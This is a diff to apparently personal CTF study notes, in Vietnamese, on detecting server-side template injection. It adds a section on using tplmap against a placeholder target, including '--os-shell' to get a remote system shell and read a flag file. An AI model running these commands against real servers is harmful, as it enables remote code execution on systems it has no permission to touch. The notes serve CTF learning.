@@ -43,6 +43,28 @@ if __name__ == "__main__":
 - Điều kiện `"49" in r.text and p not in r.text` là phần quan trọng nhất của file này: chỉ thấy số `49` trong response **chưa đủ** để khẳng định SSTI, vì có thể trang vốn đã có số 49 ở đâu đó sẵn hoặc bạn nhầm — phải đồng thời kiểm tra chuỗi payload gốc (`p`, ví dụ `"{{7*7}}"`) **không còn** xuất hiện nguyên văn trong response, tức là nó đã bị "tính toán" đi chứ không phải in ra y nguyên.
 - Khi tìm ra đúng cú pháp (ví dụ `{{7*7}}` cho ra 49 đúng điều kiện), bạn biết chắc engine thuộc nhóm Jinja2/Twig — bước tiếp theo (không nằm trong snippet này) là đổi `7*7` thành 1 payload mạnh hơn dành riêng cho đúng engine đó để chạy được lệnh hệ thống thật, ví dụ với Jinja2 có các chuỗi payload riêng dựa trên class Python có sẵn.
 
+## Dùng tool có sẵn `tplmap` thay vì tự viết tay
+
+Script tay ở trên chỉ giúp NHẬN DIỆN engine. Khi đã chắc có SSTI và muốn khai thác tới RCE (chạy lệnh hệ thống thật) mà không muốn tự tra payload đúng theo từng engine, dùng `tplmap` đã có sẵn tại `~/hoc/CTF/Tools/web/tplmap/`:
+
+```bash
+spwn
+cd ~/hoc/CTF/Tools/web/tplmap
+
+# Tham số nghi dính nằm trong query string -- để nguyên giá trị thật, tplmap tự dò
+python3 tplmap.py -u "http://target/render?name=John"
+
+# Nếu dính POST form
+python3 tplmap.py -u "http://target/render" -d "name=John"
+
+# Sau khi tplmap báo tìm thấy (ví dụ "Jinja2 server-side template injection"), chạy lệnh hệ thống trực tiếp:
+python3 tplmap.py -u "http://target/render?name=John" --os-shell
+```
+
+- `-u` giống `requests`: dán nguyên URL kèm query string thật (giá trị tham số không cần đổi, tplmap tự thay bằng payload của nó).
+- Khi `tplmap` báo tìm thấy, nó tự in rõ tên engine (Jinja2/Mako/Freemarker/...) — khớp với bước "nhận diện cú pháp" đã làm ở snippet trên, nhưng tplmap tự thử luôn hàng chục kỹ thuật khai thác đúng theo engine đó, không cần bạn tự tra payload RCE riêng.
+- `--os-shell` mở 1 shell tương tác chạy lệnh hệ thống qua chính lỗ hổng SSTI — gõ lệnh đọc flag trực tiếp từ đó (`cat /flag.txt`).
+
 ## Lưu ý nhanh
 
 - Chỉ dùng phép tính đơn giản (`7*7`) để nhận diện trước — đừng vội gửi payload chạy lệnh hệ thống ngay khi chưa chắc có SSTI, dễ gây lỗi/sập service không cần thiết.
